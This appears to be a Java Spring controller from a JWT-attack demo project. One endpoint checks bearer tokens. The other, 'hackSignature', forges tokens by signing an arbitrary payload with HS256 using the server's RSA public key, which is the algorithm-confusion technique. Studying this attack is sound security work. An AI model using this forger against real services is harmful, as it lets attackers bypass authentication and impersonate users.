package com.adioss.hack;

import com.adioss.hack.utils.JwtKeyManager;
import com.adioss.hack.utils.KeyTool;
import com.auth0.jwk.JwkException;
import io.jsonwebtoken.Claims;
import io.jsonwebtoken.Jws;
import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.SignatureAlgorithm;
import org.springframework.web.bind.annotation.*;

import java.net.MalformedURLException;
import java.security.PublicKey;
import java.util.Arrays;
import java.util.List;

@RestController
@RequestMapping("rest")
public class MainRestController {

    private final JwtKeyManager jwtKeyManager;

    public MainRestController(JwtKeyManager jwtKeyManager) {
        this.jwtKeyManager = jwtKeyManager;
    }

    @GetMapping(path = "/collectMeme", produces = "application/json")
    public String collectMeme(@RequestHeader("Authorization") String authorization) throws MalformedURLException, JwkException {
        String jwtAsString = authorization.replaceAll("Bearer ", "");
        Jws<Claims> jwt = jwtKeyManager.checkSession(jwtAsString);
        jwtKeyManager.checkRoles(jwt);
        // here goes the implementation
        System.out.println("Implementation in progress: wait and see.");
        return "{\"result\": \"wip\"}";
    }

    @PostMapping(path = "/hackSignature")
    public String hackSignature(@RequestBody String content) throws Exception {
        List<String> splittedContent = Arrays.asList(content.split("\\|"));
        String body = splittedContent.get(0);
        String publicKeyAsString = splittedContent.get(1);
        PublicKey publicKey = KeyTool.loadPublicKeyFromPem(publicKeyAsString);
        System.out.println("public key to use: '" + publicKeyAsString + "'");
        System.out.println("body to convert: '" + body + "'");
        String jwt = Jwts.builder().setPayload(body).signWith(SignatureAlgorithm.HS256, publicKey).compact();
        System.out.println("jwt generated: " + jwt);
        Jws<Claims> claimsJws = Jwts.parser().setSigningKey(publicKey).parseClaimsJws(jwt);
        System.out.println("tested and extracted 'source' from body: " + claimsJws.getBody().get("source"));
        return jwt;

    }
}
